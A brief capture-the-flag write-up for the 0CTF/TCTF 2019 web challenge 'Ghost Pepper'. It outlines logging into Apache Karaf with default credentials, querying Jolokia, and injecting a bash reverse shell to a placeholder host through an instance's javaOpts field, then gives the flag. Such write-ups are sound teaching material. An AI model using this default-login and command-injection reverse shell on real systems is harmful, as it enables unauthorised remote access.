# Ghost Pepper
*0CTF/TCTF 2019 Web 125*<br>
*Writeup by Payload, KAIST GoN*


## Problem

Do you know ghost pepper?

## Summary

**Ghost Pepper == (Bhut) Jolokia == JMX**

1. Login as default credential `karaf / karaf`
2. Check `/jolikia/list`
3. Create new instance, with javaOpts :=  `|| bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1`
4. Enjoy the shell!


(detailed write up will be uploaded soon)

**`flag{DOYOULOVEJOLOKIA?ILOVEITVERYMUCH}`**
